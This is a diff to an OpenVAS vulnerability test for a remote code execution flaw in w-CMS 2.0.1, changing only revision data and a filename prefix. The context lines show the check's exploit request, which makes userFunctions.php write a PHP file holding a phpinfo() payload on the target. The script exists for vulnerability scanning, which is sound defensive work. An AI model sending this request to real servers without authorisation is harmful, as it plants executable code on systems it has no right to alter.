@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_w-cms_rce_08_13.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_w-cms_rce_08_13.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # w-CMS 2.0.1 Remote Code Execution
 #
@@ -28,13 +28,13 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103762");
-  script_version("$Revision: 11401 $");
+  script_version("$Revision: 11497 $");
   script_tag(name:"cvss_base", value:"8.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
   script_name("w-CMS 2.0.1 Remote Code Execution");
   script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122833/w-CMS-2.0.1-Remote-Code-Execution.html");
   script_xref(name:"URL", value:"http://w-cms.info/");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2013-08-16 11:12:08 +0200 (Fri, 16 Aug 2013)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -60,7 +60,9 @@ and check the response if it was successful.");
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
+vtstring = get_vt_string( lowercase:TRUE );
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
 
@@ -72,7 +74,7 @@ foreach dir( make_list_unique( "/cms", "/w-cms", "/w_cms", cgi_dirs( port:port )
 
   if( ! egrep( pattern:"Powered by.*w-CMS", string:buf ) ) continue;
 
-  file = 'openvas_' + rand() + '.php';
+  file = vtstring + '_' + rand() + '.php';
   url = dir + '/userFunctions.php?udef=activity&type=' + file  + '&content=%3C?php%20phpinfo();%20?%3E';
   req = http_get( item:url, port:port );
   buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
